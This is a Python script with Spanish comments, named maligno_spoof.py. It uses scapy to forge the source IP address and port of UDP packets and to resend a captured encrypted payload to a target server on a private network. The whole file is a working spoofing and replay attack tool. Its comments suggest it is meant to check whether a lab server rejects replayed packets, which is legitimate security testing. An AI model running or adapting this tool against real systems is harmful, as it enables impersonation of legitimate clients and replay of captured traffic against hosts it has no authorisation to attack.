#!/usr/bin/env python3
"""
maligno_spoof.py - Herramienta de inyección de paquetes UDP con IP Spoofing.
Usa scapy para falsificar la dirección IP de origen, forzando al servidor
a tratar el paquete de replay como si viniera del cliente legítimo.
"""
from scapy.all import IP, UDP, send
import binascii
import sys

# --- CONFIGURACIÓN DEL OBJETIVO ---
# La IP Física del Servidor Groso2 (Destino del paquete)
TARGET_IP = "192.168.10.12"  
TARGET_PORT = 50000           # El puerto UDP del servidor (ej. 50001)

# --- CONFIGURACIÓN DEL SPOOFING (Necesitas estos valores del Cliente Legítimo) ---
# IP de Origen Legítima (La IP real del cliente que hizo el Handshake)
SPOOF_IP = "192.168.10.100"   
# Puerto de Origen Legítimo (El puerto que el cliente usó en el Handshake)
SPOOF_PORT = 12345            

def get_valid_packet():
    print("--- INGRESO DE PAYLOAD UDP CIFRADO CAPTURADO ---")
    data = input("Hex Stream: ").strip().replace(' ', '')
    return binascii.unhexlify(data)

def attack_replay_spoof(payload):
    print(f"\n[ATAQUE DE REPLAY] Usando IP Spoofing para forzar la detección de Replay.")
    print(f"Falsificando origen: {SPOOF_IP}:{SPOOF_PORT}")
    
    # 1. Capa IP: Dirección de Origen Falsificada y Destino
    ip_layer = IP(src=SPOOF_IP, dst=TARGET_IP)
    
    # 2. Capa UDP: Puertos de Origen Falsificado y Destino
    udp_layer = UDP(sport=SPOOF_PORT, dport=TARGET_PORT)
    
    # 3. Paquete Completo (IP + UDP + Payload capturado)
    packet = ip_layer / udp_layer / payload
    
    # 4. Enviar el paquete (se necesita sudo)
    send(packet, verbose=0)
    
    print(f"-> Paquete falsificado enviado ({len(payload)} bytes) a {TARGET_IP}:{TARGET_PORT}")
    print("-> Verifica el log del servidor. Debería mostrar: '[REJECT] AEAD authentication failed...'")

def main():
    if os.geteuid() != 0:
        print("Este script requiere privilegios de root para enviar paquetes IP crudos. Ejecuta con sudo.")
        sys.exit(1)
        
    global SPOOF_IP, SPOOF_PORT
    print("=== MALIGNO SPOOF: HERRAMIENTA DE REPLAY ATTACK ===")
    
    SPOOF_IP = input(f"Ingrese la IP de Origen Legítima (Ej: {SPOOF_IP}): ")
    SPOOF_PORT = int(input(f"Ingrese el Puerto de Origen Legítimo (Ej: {SPOOF_PORT}): "))
    
    try:
        raw_data = get_valid_packet()
    except Exception as e:
        print(f"Error en el formato hex: {e}")
        return

    attack_replay_spoof(raw_data)

if __name__ == '__main__':
    import os
    main()
